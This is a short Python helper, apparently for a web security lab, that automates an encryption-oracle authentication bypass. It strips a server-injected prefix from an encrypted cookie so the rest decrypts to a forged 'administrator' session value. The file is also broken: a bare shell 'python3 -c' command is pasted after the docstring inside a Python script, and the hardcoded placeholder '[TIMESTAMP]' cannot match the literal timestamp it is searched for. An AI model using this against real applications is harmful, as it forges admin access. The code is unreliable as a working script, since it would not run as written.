#!/usr/bin/env python3
"""
oracle_stripper.py

Helper for "Authentication bypass via encryption oracle" style bugs — where
an app encrypts user-controlled input and reflects the ciphertext (e.g. in a
Set-Cookie header), and separately decrypts a user-supplied cookie and
reflects the plaintext (e.g. in an error message), using the SAME key for
both.

It automates the block-cipher math needed to strip a server-injected prefix
(e.g. "Invalid email address: ") from a block of ciphertext, so the
remaining bytes decrypt cleanly to just your forged plaintext
(e.g. "administrator:<timestamp>").

Does NOT break the cipher itself. It only automates:
  - URL/base64 decoding the ciphertext
  - locating your known plaintext inside the server's error message to
    detect the fixed prefix length
  - rounding that prefix up to the cipher's block size (default 16, AES)
  - telling you how much junk padding to prepend on your NEXT encrypt
    request so the strip lands on a clean block boundary
  - stripping + re-encoding the ciphertext once it already has that
    padding baked in

Usage (see README for the full two-pass workflow):

    python3 oracle_stripper.py \\
        --cookie "<url-encoded notification cookie>" \\
        --error-message "Invalid email address: xxxxxxxxxadministrator:1793607115644" \\
        --known-plaintext "xxxxxxxxxadministrator:1793607115644"
"""
python3 -c "
import base64, urllib.parse

def strip_prefix_auto(cookie_url_encoded, error_message, known_plaintext):
    idx = error_message.find(known_plaintext)
    if idx == -1:
        print(\"Couldn't find plaintext in error message\")
        return
    prefix_len = idx
    url_decoded = urllib.parse.unquote(cookie_url_encoded)
    raw = base64.b64decode(url_decoded)
    total = len(raw)
    strip_bytes = ((prefix_len + 15) // 16) * 16
    pad_needed = strip_bytes - prefix_len
    print(f'Prefix length: {prefix_len}')
    print(f'Total bytes: {total}')
    print(f'Strip bytes: {strip_bytes}')
    print(f'Junk padding needed: {pad_needed}')
    if total > strip_bytes:
        stripped = raw[strip_bytes:]
        b64 = base64.b64encode(stripped).decode()
        url = urllib.parse.quote(b64, safe='')
        print('Stripped cookie:', url)

error_message = 'Invalid email address: xxxxxxxxxadministrator:1793601652468'
known_plaintext = 'xxxxxxxxxadministrator:[TIMESTAMP]'
cookie = 'YOUR_URL_ENCODED_COOKIE_HERE'

strip_prefix_auto(cookie, error_message, known_plaintext)
"
